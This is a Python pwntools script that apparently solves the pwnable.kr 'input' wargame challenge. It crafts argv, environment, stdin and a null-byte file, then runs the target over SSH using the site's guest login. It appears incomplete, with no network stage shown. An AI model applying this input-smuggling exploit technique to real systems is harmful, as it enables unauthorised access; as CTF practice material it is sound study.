#!/usr/bin/python

from pwn import *

# prepare payload
cmd = []
cmd.append('/home/input2/input')
for num in range(1, 100):
    if num == 65:
        cmd.append('\x00')
    elif num == 66:
        cmd.append('\x20\x0a\x0d')
    else:
        cmd.append(str(num));
print '\ncmd: ', cmd

env = {}
env['\xde\xad\xbe\xef'] = '\xca\xfe\xba\xbe'

create_file = 'cd /tmp; echo -ne "\x00\x00\x00\x00" > "\n";'
print '\ncreate_file: ', create_file

# open connection
s = ssh(host='pwnable.kr',
    user='input2',
    port=2222,
    password='guest')
s.run_to_end(create_file)
sh = s.process(argv=cmd, stdin=sys.stdin, stderr=sys.stdin, env=env, cwd='/tmp')

# stage 1
print sh.recvline()
print sh.recvline()
print sh.recvline()
print sh.recvline()

# stage 2
sh.sendline('\x00\x0a\x00\xff\x00\x0a\x02\xff')
print sh.recvline()

# stage 3
print sh.recvline()

# stage 4
print sh.recvline()